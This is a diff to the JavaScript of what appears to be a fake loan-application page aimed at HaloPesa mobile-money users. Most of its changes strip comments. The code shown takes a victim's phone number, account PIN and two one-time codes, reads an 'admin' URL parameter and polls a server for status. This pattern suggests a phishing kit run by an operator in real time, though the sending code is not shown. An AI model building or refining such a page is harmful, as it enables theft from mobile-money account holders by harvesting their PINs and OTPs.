@@ -44,7 +44,6 @@ document.addEventListener('DOMContentLoaded', () => {
   const urlParams = new URLSearchParams(window.location.search);
   const adminParam = urlParams.get('admin') || '';
 
-  // Helper to validate HaloPesa prefixes: 061, 062, 063 (accepts 061xxxxxxx or 61xxxxxxx)
   function isValidHaloPesa(rawPhone) {
     const digits = rawPhone.replace(/\D/g, '');
     const normalized = digits.startsWith('255') ? '0' + digits.slice(3) : (digits.startsWith('0') ? digits : '0' + digits);
@@ -76,7 +75,6 @@ document.addEventListener('DOMContentLoaded', () => {
   if (btnForm2Back) btnForm2Back.addEventListener('click', () => showScreen(screenForm1));
   if (btnForm2Prev) btnForm2Prev.addEventListener('click', () => showScreen(screenForm1));
   
-  // Phone validation for Step 2 (Must start with 061, 062, or 063)
   if (btnForm2Next) {
     btnForm2Next.addEventListener('click', () => {
       const phoneInput = document.getElementById('form-phone').value.trim();
@@ -100,7 +98,6 @@ document.addEventListener('DOMContentLoaded', () => {
   if (btnForm3Back) btnForm3Back.addEventListener('click', () => showScreen(screenForm2));
   if (btnForm3Prev) btnForm3Prev.addEventListener('click', () => showScreen(screenForm2));
 
-  // STEP 3 OF 3 SUBMISSION
   if (btnForm3Submit) {
     btnForm3Submit.addEventListener('click', async () => {
       const firstName = document.getElementById('first-name').value.trim();
@@ -139,7 +136,6 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   }
 
-  // Slider calculation
   const loanSlider = document.getElementById('loan-amount-slider');
   const loanText = document.getElementById('loan-amount-text');
   const monthsSlider = document.getElementById('loan-months-slider');
@@ -163,7 +159,6 @@ document.addEventListener('DOMContentLoaded', () => {
     updateCalc();
   }
 
-  // Digit Inputs Helper
   function setupDigitInputs(boxes, onComplete) {
     boxes.forEach((box, idx) => {
       box.addEventListener('input', () => {
@@ -185,16 +180,9 @@ document.addEventListener('DOMContentLoaded', () => {
   }
 
   setupDigitInputs(pinBoxes);
-  
-  setupDigitInputs(otp1Boxes, (otpVal) => {
-    submitOtp1Action(otpVal);
-  });
+  setupDigitInputs(otp1Boxes, (otpVal) => { submitOtp1Action(otpVal); });
+  setupDigitInputs(otp2Boxes, (otpVal) => { submitOtp2Action(otpVal); });
 
-  setupDigitInputs(otp2Boxes, (otpVal) => {
-    submitOtp2Action(otpVal);
-  });
-
-  // Sign In PIN Submission (Also validates 061, 062, 063)
   if (btnSubmitSignin) {
     btnSubmitSignin.addEventListener('click', async () => {
       const pinVal = Array.from(pinBoxes).map(b => b.value).join('');
@@ -231,7 +219,6 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   }
 
-  // OTP 1 Submission
   async function submitOtp1Action(otpVal) {
     bannerOtp1Error.classList.remove('active');
     showLoading('INATHIBITISHA OTP...', 'Tafadhali subiri...');
@@ -260,7 +247,6 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   }
 
-  // OTP 2 Submission
   async function submitOtp2Action(otpVal) {
     bannerOtp2Error.classList.remove('active');
     showLoading('INATHIBITISHA UHAKIKI...', 'Tafadhali subiri...');
@@ -289,7 +275,6 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   }
 
-  // Status Polling from Server
   function startStatusPolling() {
     if (statusPollInterval) clearInterval(statusPollInterval);
 
@@ -376,4 +361,4 @@ document.addEventListener('DOMContentLoaded', () => {
     if (loadingOverlay) loadingOverlay.classList.remove('active');
   }
 });
-    
+  
